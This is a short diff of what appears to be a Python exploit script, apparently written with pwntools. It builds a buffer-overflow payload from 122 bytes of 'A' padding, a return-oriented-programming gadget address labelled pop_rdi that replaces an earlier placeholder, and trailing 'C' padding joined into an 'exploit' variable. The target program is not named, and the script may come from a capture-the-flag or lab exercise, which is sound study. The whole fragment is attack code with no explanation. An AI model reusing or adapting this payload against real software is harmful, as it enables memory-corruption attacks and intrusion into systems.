@@ -22,7 +22,7 @@ pop_rdi = p64(0x0000000000007f75)
 
 # Exploit
 padA = b'A' * 122
-padB = b'\x00\x42\x42'
+padB = pop_rdi
 padC = b'C' * (200-122-8)
 
 exploit = padA + padB + padC
